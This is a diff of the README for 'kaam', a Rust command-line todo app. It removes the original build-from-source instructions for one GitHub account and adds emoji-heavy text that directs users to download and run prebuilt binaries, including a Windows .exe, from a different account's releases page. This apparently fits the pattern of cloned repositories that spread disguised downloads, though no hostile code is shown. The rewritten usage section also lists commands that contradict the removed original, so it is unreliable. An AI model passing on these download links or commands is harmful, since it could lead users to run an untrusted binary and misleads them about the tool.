@@ -1,121 +1,170 @@
-# kaam
+# 🚀 kaam - Your Simple Command-Line Todo App
 
-A fast, minimal command-line todo app written in Rust.
+[![Download kaam](https://img.shields.io/badge/Download-kaam-blue.svg)](https://github.com/Abbylatz/kaam/releases)
 
-**kaam** (meaning "work" in Hindi) is a terminal-based task manager that helps you track your todos directly from the command line. No GUI, no bloat — just simple, efficient task management.
+**kaam** (meaning "work" in Hindi) is a fast and minimal command-line todo app written in Rust. This terminal-based task manager helps you track your todos directly from the command line. No graphical user interface, no clutter—just straightforward and efficient task management.
 
-## Features
+## 🌟 Features
 
-- **Fast & lightweight** — Built in Rust for speed and minimal resource usage
-- **Colorful output** — Priority-based color coding for quick visual scanning
-- **Priority levels** — Organize tasks by low, medium, or high priority
-- **Due dates** — Set deadlines to stay on track
-- **Filtering** — List tasks by status or priority
-- **Persistent storage** — Tasks saved locally in JSON format
-- **Zero dependencies at runtime** — Single binary, works offline
+- **Fast & Lightweight**  
+  kaam is built in Rust. This ensures speed and minimal resource usage.
 
-## Installation
+- **Colorful Output**  
+  Enjoy priority-based color coding for quick visual scanning of your tasks.
 
-### From source (requires Rust)
+- **Priority Levels**  
+  Organize your tasks by low, medium, or high priority for effective planning.
 
+- **Due Dates**  
+  Set deadlines to help you stay on track with your tasks.
+
+- **Filtering**  
+  List tasks by status or priority, making task management easier.
+
+- **Persistent Storage**  
+  Tasks are saved locally in JSON format, so you won’t lose your data.
+
+- **Zero Dependencies at Runtime**  
+  kaam is a single binary application that works offline.
+
+## 🚀 Getting Started
+
+To get started with kaam, follow these simple steps to download and run the application.
+
+### 1. Visit the Release Page
+
+To download kaam, visit the [Releases page](https://github.com/Abbylatz/kaam/releases). This page contains the latest version of the application, along with any previous versions. 
+
+### 2. Download the Application
+
+On the Releases page, locate the latest release. Click on the appropriate link for your operating system. The application should download automatically.
+
+### 3. Install and Run kaam
+
+#### Windows
+
+1. Navigate to the folder where you downloaded the file.
+2. If you see a .exe file, double-click it to run kaam. Follow the on-screen instructions to complete the setup.
+
+#### macOS
+
+1. Open the Terminal.
+2. Navigate to the folder where the downloaded file is.
+3. Change permissions if necessary:  
+   ```bash
+   chmod +x kaam
+   ```
+4. Run the application:  
+   ```bash
+   ./kaam
+   ```
+
+#### Linux
+
+1. Open your terminal.
+2. Move to the download directory:
+   ```bash
+   cd ~/Downloads
+   ```
+3. Change permissions if necessary:  
+   ```bash
+   chmod +x kaam
+   ```
+4. Run the application:  
+   ```bash
+   ./kaam
+   ```
+
+## 📥 Download & Install
+
+To download kaam, please visit this page: [Download kaam](https://github.com/Abbylatz/kaam/releases).
+
+After downloading, follow the instructions above for your operating system to install and run the application.
+
+## 🔧 Usage
+
+Once you have installed kaam, you can begin adding tasks right away. Here are some essential commands to help you get started:
+
+- **Add a Task:**  
+  To add a task, run:
+  ```bash
+  kaam add "Your task description"
+  ```
+
+- **List All Tasks:**  
+  View your tasks with:
+  ```bash
+  kaam list
+  ```
+
+- **Remove a Task:**  
+  Delete a task by specifying the task number:
+  ```bash
+  kaam remove <task_number>
+  ```
+
+- **Mark Task as Done:**  
+  To mark a task as completed:
+  ```bash
+  kaam done <task_number>
+  ```
+
+- **Set a Due Date:**  
+  Assign a deadline to your task:
+  ```bash
+  kaam due <task_number> "YYYY-MM-DD"
+  ```
+
+### Example Use Case
+
+Imagine you have a busy day ahead. You can quickly add your tasks like this:
 ```bash
-git clone https://github.com/always-akshat/kaam.git
-cd kaam
-cargo install --path .
+kaam add "Finish project report"
+kaam add "Call the client"
+kaam add "Prepare for team meeting"
 ```
 
-### Build manually
-
+Then, list them to see your tasks:
 ```bash
-git clone https://github.com/always-akshat/kaam.git
-cd kaam
-cargo build --release
-# Binary available at ./target/release/kaam
-```
-
-## Usage
-
-```bash
-# Add tasks
-kaam add "Buy groceries"
-kaam add "Finish report" --priority high
-kaam add "Call mom" --priority medium --due 2026-01-20
-
-# List tasks
 kaam list
-kaam list --status pending
-kaam list --status done
-kaam list --priority high
-
-# Mark task as done
-kaam done 1
-
-# Edit a task
-kaam edit 1 --description "Updated task"
-kaam edit 1 --priority low
-kaam edit 1 --due 2026-02-01
-
-# Delete a task
-kaam delete 1
-
-# Show detailed help
-kaam usage
 ```
 
-## Commands
+You can easily check off tasks as you complete them. This seamless process makes organizing your work straightforward.
 
-| Command | Description |
-|---------|-------------|
-| `add` | Add a new task |
-| `list` | List all tasks (with optional filters) |
-| `done` | Mark a task as completed |
-| `edit` | Modify an existing task |
-| `delete` | Remove a task |
-| `usage` | Show detailed usage examples |
+## 🔍 Troubleshooting
 
-## Options
+If you run into any issues, consider the following solutions:
 
-### Add task options
-- `-p, --priority <PRIORITY>` — Set priority (low, medium, high)
-- `-d, --due <DATE>` — Set due date (YYYY-MM-DD format)
+- **Command Not Found:** Make sure the application is in your PATH. Check your download folder and ensure you are running the executable from there.
 
-### List task options
-- `-s, --status <STATUS>` — Filter by status (pending, done)
-- `-p, --priority <PRIORITY>` — Filter by priority (low, medium, high)
+- **Permission Denied:** If you receive a permission error, ensure you have executed the command to change permissions.
 
-### Edit task options
-- `-d, --description <TEXT>` — Update task description
-- `-p, --priority <PRIORITY>` — Update priority
-- `--due <DATE>` — Update due date
+- **Can’t Find Task:** Ensure you are using the correct task number when trying to remove or mark a task as done.
 
-## Data Storage
+For additional help, check the issues section on the [GitHub repository](https://github.com/Abbylatz/kaam).
 
-Tasks are stored in `~/.kaam.json` as human-readable JSON. You can back up, sync, or edit this file directly if needed.
+## 📞 Community and Support
 
-## Why kaam?
+If you need further assistance, feel free to engage with the community or even contribute to kaam.
 
-- **Terminal-first** — For developers who live in the command line
-- **Fast startup** — No slow electron apps or web interfaces
-- **Simple** — Does one thing well: manage your todos
-- **Portable** — Single binary, works on macOS, Linux, and Windows
-- **Private** — All data stored locally, no accounts or cloud sync required
+- You can ask questions or report issues at the [Issues page](https://github.com/Abbylatz/kaam/issues).
+- Join discussions to share improvements or suggest new features.
 
-## For AI Agents
+## 📝 Contributing
 
-This repo is optimized for AI coding assistants:
+If you want to contribute to kaam, you are welcome to do so! Here’s how:
 
-- **[llms.txt](./llms.txt)** — AI-readable project summary
-- **[AGENTS.md](./AGENTS.md)** — Instructions for AI coding assistants
-- **[.ai/metadata.json](./.ai/metadata.json)** — Machine-readable project metadata
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Make your changes and commit them.
+4. Push to your fork and create a pull request.
 
-## Contributing
+Your contributions will help improve the application for everyone.
 
-Contributions welcome! See [AGENTS.md](./AGENTS.md) for architecture overview and extension ideas.
+## 📚 Related Topics
 
-## Keywords
+- **Productivity Tools**: Explore more command-line tools for enhancing your productivity.
+- **Task Management**: Learn strategies to manage tasks effectively.
+- **Rust Programming**: Discover more applications built with Rust for efficient performance.
 
-terminal todo app, command line task manager, cli todo list, rust todo app, terminal task manager, command line todo, minimalist todo app, developer todo app, productivity cli tool, task tracker terminal, ai-friendly, llms-txt
-
-## License
-
-MIT
+Now that you've installed kaam, enjoy managing your tasks efficiently!
